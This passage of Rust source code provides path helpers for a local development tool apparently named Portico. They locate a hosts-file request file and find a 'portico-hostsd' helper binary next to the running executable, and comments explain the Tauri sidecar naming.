/// The file the helper watches. Writing it is what triggers a sync.
pub fn hosts_request() -> PathBuf {
    root().join("hosts-request.json")
}

/// The freshly built helper, which ships alongside whichever binary is running.
pub fn hostsd_source() -> Option<PathBuf> {
    let exe = std::env::current_exe().ok()?;
    find_hostsd_in(exe.parent()?)
}

/// Locate the helper next to a binary.
///
/// Accepts both the plain name (a cargo build, where it sits beside the app)
/// and a target-triple suffix, which is how Tauri stages a sidecar. Matching
/// only the plain name risks bundling an app whose helper is present but
/// unfindable — the app would work for the developer and prompt for a password
/// on every domain for everyone else.
pub fn find_hostsd_in(dir: &std::path::Path) -> Option<PathBuf> {
    let plain = dir.join("portico-hostsd");
    if plain.is_file() {
        return Some(plain);
    }
    std::fs::read_dir(dir)
        .ok()?
        .flatten()
        .map(|e| e.path())
        .find(|p| {
            p.is_file()
                && p.file_name()
                    .and_then(|n| n.to_str())
                    .is_some_and(|n| n.starts_with("portico-hostsd-"))
        })
}

// --- Standalone mode: everything below lives inside the user's own home,
// --- so none of it needs an administrator.

